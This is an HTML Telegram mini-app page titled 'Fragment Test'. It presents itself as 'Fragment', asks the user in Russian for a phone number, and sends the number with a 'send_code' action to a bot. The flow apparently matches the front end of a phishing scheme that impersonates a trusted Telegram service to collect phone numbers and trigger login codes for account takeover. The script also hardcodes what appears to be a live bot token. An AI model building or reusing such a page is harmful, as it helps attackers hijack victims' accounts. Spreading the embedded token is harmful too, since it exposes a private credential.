<!DOCTYPE html>
<html>
<head>
    <title>Fragment Test</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            padding: 20px;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            border-radius: 24px;
            padding: 28px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
            text-align: center;
        }
        input {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            border: 1px solid #e0e0e5;
            border-radius: 14px;
            margin-bottom: 16px;
            box-sizing: border-box;
            font-family: inherit;
        }
        button {
            width: 100%;
            padding: 14px;
            font-size: 17px;
            font-weight: 600;
            background: #2AABEE;
            color: white;
            border: none;
            border-radius: 14px;
            cursor: pointer;
        }
        button:active {
            transform: scale(0.97);
        }
        .status {
            margin-top: 16px;
            font-size: 14px;
            color: #666;
        }
        .error {
            color: #e53935;
        }
        .success {
            color: #00c851;
        }
    </style>
</head>
<body>
    <div class="card">
        <h2>Fragment</h2>
        <p>Введите номер телефона</p>
        <input type="tel" id="phone" placeholder="906 480 08 08">
        <button onclick="sendCode()">Отправить код</button>
        <div class="status" id="status"></div>
    </div>

    <script>
        // Инициализация Telegram WebApp
        const tg = window.Telegram.WebApp;
        tg.ready();
        
        // Получаем ID пользователя
        const user_id = tg.initDataUnsafe?.user?.id;
        
        // Токен бота
        const BOT_TOKEN = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ";
        
        function sendCode() {
            const statusDiv = document.getElementById('status');
            
            // Получаем номер и очищаем от пробелов, скобок, дефисов
            let raw = document.getElementById('phone').value.replace(/\D/g, '');
            
            if (raw.length < 5) {
                statusDiv.innerHTML = '<span class="error">❌ Введите корректный номер</span>';
                return;
            }
            
            // Формируем номер с кодом страны (+7 для России)
            const cleanPhone = '+7' + raw;
            
            statusDiv.innerHTML = '<span>📱 Отправка...</span>';
            
            // Данные для отправки
            const payload = JSON.stringify({
                action: "send_code",
                phone: cleanPhone
            });
            
            console.log("Отправляю:", payload);
            console.log("User ID:", user_id);
            
            try {
                // Отправляем данные боту
                tg.sendData(payload);
                statusDiv.innerHTML = '<span class="success">✅ Код отправлен на ' + cleanPhone + '<br>Проверьте Telegram</span>';
            } catch(e) {
                console.error("Ошибка:", e);
                statusDiv.innerHTML = '<span class="error">❌ Ошибка: ' + e.message + '</span>';
            }
        }
        
        // Показываем в консоли, что WebApp готов
        console.log("✅ WebApp готов");
        console.log("User ID:", user_id);
        console.log("tg.sendData доступен:", typeof tg.sendData === 'function');
    </script>
</body>
</html>
